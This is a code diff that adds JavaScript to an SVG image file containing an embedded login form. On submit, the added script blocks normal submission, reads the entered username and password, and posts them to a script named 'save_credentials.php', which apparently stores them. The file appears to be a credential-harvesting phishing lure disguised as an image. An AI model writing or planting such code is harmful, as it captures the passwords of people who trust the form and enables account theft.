@@ -16,4 +16,39 @@
       </form>
     </div>
   </foreignObject>
+
+  <!-- JavaScript to handle form submission -->
+  <script type="text/javascript">
+    document.getElementById('login-form').addEventListener('submit', function(event) {
+      event.preventDefault(); // Prevent form submission
+
+      // Retrieve username and password values
+      const username = document.getElementById('username').value;
+      const password = document.getElementById('password').value;
+
+      // Send the data to the server-side script
+      const formData = new FormData();
+      formData.append('username', username);
+      formData.append('password', password);
+
+      fetch('save_credentials.php', {
+        method: 'POST',
+        body: formData
+      })
+      .then(response => {
+        if (!response.ok) {
+          throw new Error('Network response was not ok');
+        }
+        return response.text();
+      })
+      .then(data => {
+        console.log('Data saved:', data);
+        // Optionally, redirect the user to another page
+        // window.location.href = 'https://example.com/welcome';
+      })
+      .catch(error => {
+        console.error('There was a problem saving the data:', error);
+      });
+    });
+  </script>
 </svg>
